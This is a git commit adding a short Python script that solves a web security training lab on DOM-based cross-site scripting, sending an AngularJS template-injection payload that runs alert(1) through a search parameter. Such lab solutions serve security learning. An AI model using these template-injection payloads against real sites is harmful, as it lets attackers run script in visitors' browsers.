b6e8f2b8b499797840d781c75f935128071b0cb5
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-03-31 13:42:44 -0700

    DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

---
+++ web_security_academy/web-security/cross-site-scripting/dom-based/lab-angularjs-expression.py
@@ -0,0 +1,9 @@
+from web_security_academy.core.logger import logger
+
+
+def solve_lab(session):
+    xss = "{{$on.constructor('alert(1)')()}}"
+
+    session.get_path("/", params={"search": xss})
+    logger.info("Searched the following payload:")
+    logger.info(xss)
